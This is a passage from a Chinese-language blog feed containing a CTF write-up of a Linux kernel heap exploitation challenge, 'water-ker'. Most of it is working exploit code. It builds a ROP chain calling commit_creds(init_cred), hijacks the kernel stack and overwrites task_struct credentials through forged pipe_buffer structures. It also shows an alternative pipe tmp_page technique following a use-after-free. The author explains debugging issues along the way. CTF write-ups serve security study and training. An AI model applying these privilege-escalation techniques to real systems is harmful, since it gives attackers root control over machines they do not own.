pte_val;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>构造rop链并写到栈上，尽量把rop链往后写前面用ret填充，这样就不用算偏移了（</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* construct the ROP */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ((<span class="hljs-number">0x1000</span> - <span class="hljs-number">8</span> * <span class="hljs-number">11</span>) / <span class="hljs-number">8</span>); i++) &#123;<br>    rop[idx++] = RET + kernel_offset;<br>&#125;<br>  <br>rop[idx++] = POP_RDI_RET + kernel_offset;<br>rop[idx++] = INIT_CRED + kernel_offset;<br>rop[idx++] = COMMIT_CREDS + kernel_offset;<br>rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE +<span class="hljs-number">54</span> + kernel_offset;<br>rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>rop[idx++] = (<span class="hljs-type">size_t</span>) get_root_shell;<br>rop[idx++] = user_cs;<br>rop[idx++] = user_rflags;<br>rop[idx++] = user_sp;<br>rop[idx++] = user_ss;<br>  <br>stack_page = direct_map_addr_to_page_addr(stack_addr_another);<br>  <br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);<br>  <br>sleep(<span class="hljs-number">5</span>);<br>  <br>arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) stack_page, rop, <span class="hljs-number">0xff0</span>);<br></code></pre></td></tr></table></figure><p>函数和栈地址（rbp）一览（好长的调用链(lll￢ω￢)）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* task_struct-&gt;stack = 0xffffc900005ff000 */</span><br>entry_SYSCALL_64<span class="hljs-number">0xffffc900005ffff8</span>↓<br>do_syscall_64<span class="hljs-number">0xffffc900005fff48</span><br>__x64_sys_write<span class="hljs-number">0xffffc900005ffe78</span><br>ksys_write<span class="hljs-number">0xffffc900005ffe68</span><br>vfs_write<span class="hljs-number">0xffffc900005ffe28</span><br>pipe_write<span class="hljs-number">0xffffc900005ffd90</span><br>copy_page_from_iter <span class="hljs-number">0xffffc900005ffce8</span><br>_copy_from_iter<span class="hljs-number">0xffffc900005ffca8</span><br>copyin<span class="hljs-number">0xffffc900005ffc10</span><br>rep_movs_alternative<span class="hljs-number">0xffffc900005ffc10</span><br></code></pre></td></tr></table></figure><p>数据写入实际上发生在rep_movs_alternative中，这个函数退出时就开始执行调用链了</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/stack3.png" class title="stack3"></li><li><p><strong>！！一个小（da）插曲！！</strong></p><p>arttnba3的博客有提到会出现rop链写入失败不知道写到哪去了的问题</p><p>这是泄露的内核栈地址</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/stack.png" class title="stack"><p>但是内核实际上使用的栈地址（也是之后要写入rop链的栈地址）是stack_addr + 0x3000</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/stack2.png" class title="stack2"><p>arttnba3的原exp是泄露task_struct-&gt;stack（查找pgd时也是找的这一页），在写入的时候在对应页+ 3 * 0x40</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">pgd_vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    stack_addr = tsk_buf[<span class="hljs-number">4</span>];<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_rop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) (stack_page + <span class="hljs-number">0x40</span> * <span class="hljs-number">3</span>), rop, <span class="hljs-number">0xff0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>但是实测stack使用的page不一定是物理连续的(ˉ▽ˉ；)…，所以会不知道写哪去了</p><p>所以更改一下最开始的stack泄露，直接+ 0x3000，查找pgd时直接查找这一页，写入也直接写入这一页</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">pgd_vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    stack_addr = tsk_buf[<span class="hljs-number">4</span>] + <span class="hljs-number">0x3000</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_rop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) stack_page, rop, <span class="hljs-number">0xff0</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><em>ps：干了件很sb的事就是把img的包重新打包的时候打成cpio了，md断点突然打不上了血压暴涨发出尖锐的爆鸣声(╯▔皿▔)╯</em></p><h3 id="修改cred"><a href="#修改cred" class="headerlink" title="修改cred"></a>修改cred</h3><p>init_cred为有着root权限的cred，我们可以直接将当前进程的cred修改为该cred以完成提权</p><p>arttnba3的exp里是使用task_struct-&gt;real_parent向前遍历直到task_struct-&gt;real_parent &#x3D;&#x3D; &amp;task_struct来寻找init进程（所有进程的父进程）的task_struct来寻找init_cred，这道题有init_cred地址就不遍历了（绝对不是因为我懒(‾◡◝)）</p><p><em>ps：这里我又干了件很sb的事就是所有地址都多加了个kernel_base(ˉ▽ˉ；)…，🧠飞飞~</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief find the init_task and copy something to current task_struct</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    init_task = kernel_offset + INIT_TASK;<br>    init_cred = kernel_offset + INIT_CRED;<br>    init_nsproxy = kernel_offset + INIT_NSPROXY;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">367</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">368</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">381</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>),<br>                            &amp;buf[<span class="hljs-number">512</span>], <span class="hljs-number">0x100</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br><br>    get_root_shell();<br>&#125;<br></code></pre></td></tr></table></figure><p>这种提权好像只是有概率成功……(・∀・(・∀・(・∀・*)</p><p>破案了，跟上面一样的问题，task_struct所在的两页不一定物理连续，所以cred可能又写到别的地方去了</p><p>更改后的exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief find the init_task and copy something to current task_struct</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    init_task = kernel_offset + INIT_TASK;<br>    init_cred = kernel_offset + INIT_CRED;<br>    init_nsproxy = kernel_offset + INIT_NSPROXY;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br><br>    <span class="hljs-type">size_t</span> current_task_page_1 = direct_map_addr_to_page_addr(current_task + <span class="hljs-number">0x1000</span>);<br><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page_1), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">367</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">368</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">381</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page_1,<br>                            &amp;buf[<span class="hljs-number">512</span>], <span class="hljs-number">0xff0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br><br>    get_root_shell();<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p><em><strong>特别鸣谢nightu师傅的指导o(*￣▽￣*)ブ</strong></em></p><h2 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h2><p>pipe_inode_info结构体用于描述一个pipe</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p>head、tail：使用的bufs的序号，头和尾</p></li><li><p>tmp_page：之前释放的page，已经读完数据</p></li><li><p>bufs：pipe_buffer结构体数组</p><p>重温一下pipe_buffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>page：数据储存的页</li><li>offset：read指针</li><li>len：write指针 - read指针</li><li>flags：一些flag，比如能否并入非full的buffer就是0x10</li><li>private：ops使用的private data</li></ul></li></ul><h2 id="tmp-page"><a href="#tmp-page" class="headerlink" title="tmp_page"></a>tmp_page</h2><p>tmp_page其实就是一个page的后备，可存一个page，在向一个新的pipe中write的时候如果tmp_page不为空则使用tmp_page的page，否则申请一个page</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br><br><span class="hljs-keyword">if</span> (!page) &#123;<br>page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);<br><span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>ret = ret ? : -ENOMEM;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pipe-&gt;tmp_page = page;<br>&#125;<br><br><br><br><span class="hljs-comment">/* Insert it into the buffer array */</span><br>buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>buf-&gt;page = page;<br>buf-&gt;ops = &amp;anon_pipe_buf_ops;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (is_packetized(filp))<br>buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br><span class="hljs-keyword">else</span><br>buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br><br>copied = copy_page_from_iter(page, <span class="hljs-number">0</span>, PAGE_SIZE, from);<br></code></pre></td></tr></table></figure><p>在pipe_read中，如果一个buf中的数据被读完了，调用pipe_buf_release</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!buf-&gt;len) &#123;<br>pipe_buf_release(pipe, buf);<br>spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br>tail++;<br>pipe-&gt;tail = tail;<br>spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br>&#125;<br></code></pre></td></tr></table></figure><p>pipe_buf_release回先将pipe_buffer的ops置空，再调用对应的release函数，这里是anon_pipe_buf_release</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">pipe_buf_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> pipe_buffer *buf)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span> =</span> buf-&gt;ops;<br><br>buf-&gt;ops = <span class="hljs-literal">NULL</span>;<br>ops-&gt;release(pipe, buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>在anon_pipe_buf_release中，如果pipe_buffer的page没有别人使用且tmp_page为空则将这个page放入tmp_page备用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">anon_pipe_buf_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> pipe_buffer *buf)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> buf-&gt;page;<br><br><span class="hljs-keyword">if</span> (page_count(page) == <span class="hljs-number">1</span> &amp;&amp; !pipe-&gt;tmp_page)<br>pipe-&gt;tmp_page = page;<br><span class="hljs-keyword">else</span><br>put_page(page);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>注：</p><ul><li>任何一页的内容读完再写入都会另起一个pipe_buffer</li><li>pipe_buffer-&gt;flags没有0x10每次写入之后都会另起一个pipe_buffer</li></ul></blockquote><h2 id="简单一些的利用方式"><a href="#简单一些的利用方式" class="headerlink" title="简单一些的利用方式"></a>简单一些的利用方式</h2><p>有这个特性利用的时候其实可以不用那么复杂</p><p>此时我们已经有了一个uaf</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/tmp1.png" class title="tmp1"><ul><li><p>利用victim write修改snd_victim的目标pipe_buffer，指向要改的page</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/tmp2.png" class title="tmp2"></li><li><p>victim read读完刚修改的字节数</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/tmp3.png" class title="tmp3"><p>这时victim会将snd_victim所在page放回tmp_page</p></li><li><p>victim再次write的时候会另起一个pipe_buffer，使用tmp_page，也就是snd_victim所在的page，这样就达到了重复修改snd_victim的目的</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/tmp4.png" class title="tmp4"><p>不用担心pipe_buffer消耗完的事情，pipe_buffer会循环使用( •̀ ω •́ )✧</p></li></ul><h2 id="exp需要修改的部分"><a href="#exp需要修改的部分" class="headerlink" title="exp需要修改的部分"></a>exp需要修改的部分</h2><p><em>其实不需要两次uaf，但我用第二次uaf来确定pipd_buffer的index了</em></p><ul><li><p>main函数中删去building_self_writing_pipe</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//building_self_writing_pipe();</span><br>  <br>info_leaking_by_arbitrary_pipe();<br></code></pre></td></tr></table></figure></li><li><p>setup_evil_pipe，消耗之前write的字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">setup_evil_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> temp_buf[<span class="hljs-number">0x1000</span>];<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], temp_buf, <span class="hljs-number">0x60</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>arbitrary_read_by_pipe，要改的pipe_buffer是第三个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_read, <span class="hljs-type">void</span> *dst)</span><br>&#123;<br>    <span class="hljs-type">char</span> temp_buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-comment">/* page to read */</span><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0x1ff8</span>;<br>    evil_2nd_buf.page = page_to_read;<br>    evil_2nd_buf.ops = info_pipe_buf.ops;<br>    evil_2nd_buf.private = info_pipe_buf.private;<br>    evil_2nd_buf.flags = info_pipe_buf.flags;<br><br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], temp_zero_buf, <span class="hljs-number">96</span>*<span class="hljs-number">2</span>);<br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br><br>    read(pipe_fd[snd_vicitm_pid][<span class="hljs-number">0</span>], dst, <span class="hljs-number">0xfff</span>);<br><br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], temp_buf, <span class="hljs-number">96</span>*<span class="hljs-number">2</span> + <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>arbitrary_write_by_pipe</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_write, <span class="hljs-type">void</span> *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    <span class="hljs-type">char</span> temp_buf[<span class="hljs-number">0x1000</span>];<br><br>    evil_2nd_buf.page = page_to_write;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.ops = info_pipe_buf.ops;<br>    evil_2nd_buf.flags = info_pipe_buf.flags;<br>    evil_2nd_buf.private = info_pipe_buf.private;<br><br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], temp_zero_buf, <span class="hljs-number">96</span>*<span class="hljs-number">2</span>);<br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], src, <span class="hljs-number">0xfff</span>);<br><br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], temp_buf, <span class="hljs-number">96</span>*<span class="hljs-number">2</span> + <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>rop的时候rsp要加8</p></li></ul><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li><p>KASLR机制，物理内存探测和映射什么的（其实就是继续系统启动，乐）</p></li><li><p>What is CFI?</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>kernel</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kernel源码分析-内存管理</title>
    <link href="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <url>/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    
